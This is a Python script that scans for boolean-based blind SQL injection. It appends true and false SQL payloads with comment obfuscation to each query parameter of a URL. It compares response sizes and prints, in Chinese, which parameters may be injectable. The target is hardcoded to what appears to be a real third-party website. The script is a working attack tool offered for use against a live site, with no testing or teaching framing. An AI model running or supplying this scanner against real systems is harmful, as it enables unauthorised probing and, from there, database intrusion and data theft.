from config import HEADER
import requests



Sql_inject={
     "trues":" ANd 'foo'=/*foooooooo*/'foo'",
     "falses":" ANd 'foo'=/*foooooooo*/'foos'"
}
urls="http://www.xmhxgroup.com/overwiew_01.php?id=1"
vulnerable_para=[]



def Page_size(urls):
    try:
        if requests.get(url=urls,headers=HEADER).status_code not in [400,404,500,502]:
            Site_url=urls.split('?',1)[0]
            Para_url=urls.split('?',1)[1].split('&')


            for inject_test in Para_url:
                Para_url=urls.split('?',1)[1].split('&')
                payload=inject_test+Sql_inject["trues"]
                payloads=inject_test+Sql_inject["falses"]
                Para_url.remove(inject_test)
                target_url=Site_url+'?'+payload+'&'.join(Para_url)
                target_urls=Site_url+'?'+payloads+'&'.join(Para_url)
                wb_data=requests.get(url=target_url,headers=HEADER,timeout=5)
                wb_datas=requests.get(url=target_urls,headers=HEADER,timeout=5)
                Page_size_true=(int(wb_data.headers["content-length"]) if "content-length" in wb_data.headers else len(wb_data.content))
                Page_size_false=(int(wb_datas.headers["content-length"]) if "content-length" in wb_datas.headers else len(wb_datas.content))


                if Page_size_true != Page_size_false:
                    vulnerable_para.append(inject_test.split('=')[0])
    except:
        pass


    print("[*]--------扫描完毕 --------")
    print("[*]--------可能有注入的参数为--------]")
    print(vulnerable_para)
    return vulnerable_para
